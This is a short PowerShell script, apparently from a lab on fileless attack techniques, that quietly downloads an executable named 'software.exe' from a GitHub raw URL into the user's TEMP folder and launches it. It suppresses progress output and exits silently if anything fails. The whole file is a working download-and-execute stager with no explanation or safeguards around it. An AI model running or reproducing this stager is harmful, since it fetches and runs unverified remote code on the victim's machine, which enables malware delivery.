$ProgressPreference = 'SilentlyContinue'

$repoUrl = "https://raw.githubusercontent.com/sbkkkk/fileless-techniques-lab/main/software.exe"
$destPath = "$env:TEMP\software.exe"

try {
    Invoke-WebRequest -Uri $repoUrl -OutFile $destPath
    Start-Process $destPath
} catch {
    exit
}
